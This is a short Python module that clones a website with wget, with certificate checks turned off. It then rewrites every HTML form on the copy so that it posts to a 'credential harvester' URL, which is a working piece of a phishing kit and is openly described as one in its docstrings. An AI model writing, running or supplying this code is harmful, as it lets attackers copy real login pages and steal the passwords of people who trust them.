"""Website cloning tool"""
import subprocess
import logging
from pathlib import Path

logger = logging.getLogger(__name__)

def clone_website(url: str, output_dir: str) -> dict:
    """Clone a website using wget
    
    Args:
        url: Target URL to clone
        output_dir: Directory to save cloned site
        
    Returns:
        dict with status and path
    """
    try:
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        
        logger.info(f"Cloning {url} to {output_dir}")
        
        # Use wget to mirror the site
        cmd = [
            "wget",
            "--mirror",
            "--convert-links",
            "--adjust-extension",
            "--page-requisites",
            "--no-parent",
            "--no-check-certificate",
            "-P", str(output_path),
            url
        ]
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=60
        )
        
        if result.returncode == 0 or result.returncode == 8:  # 8 = some files not retrieved (normal)
            return {
                "success": True,
                "path": str(output_path),
                "message": f"Website cloned successfully to {output_path}"
            }
        else:
            return {
                "success": False,
                "error": result.stderr,
                "message": "Clone failed"
            }
            
    except subprocess.TimeoutExpired:
        return {
            "success": False,
            "error": "Timeout after 60 seconds",
            "message": "Clone timed out"
        }
    except Exception as e:
        logger.error(f"Clone failed: {e}")
        return {
            "success": False,
            "error": str(e),
            "message": "Clone failed"
        }

def modify_forms(html_path: str, capture_url: str) -> dict:
    """Modify HTML forms to point to credential harvester
    
    Args:
        html_path: Path to HTML file
        capture_url: URL of credential harvester
        
    Returns:
        dict with status
    """
    try:
        from bs4 import BeautifulSoup
        
        with open(html_path, 'r', encoding='utf-8', errors='ignore') as f:
            soup = BeautifulSoup(f.read(), 'html.parser')
        
        # Find all forms
        forms = soup.find_all('form')
        modified_count = 0
        
        for form in forms:
            # Change form action to our harvester
            form['action'] = capture_url
            form['method'] = 'POST'
            modified_count += 1
        
        # Write modified HTML
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(str(soup))
        
        return {
            "success": True,
            "modified_forms": modified_count,
            "message": f"Modified {modified_count} forms"
        }
        
    except Exception as e:
        logger.error(f"Form modification failed: {e}")
        return {
            "success": False,
            "error": str(e),
            "message": "Form modification failed"
        }
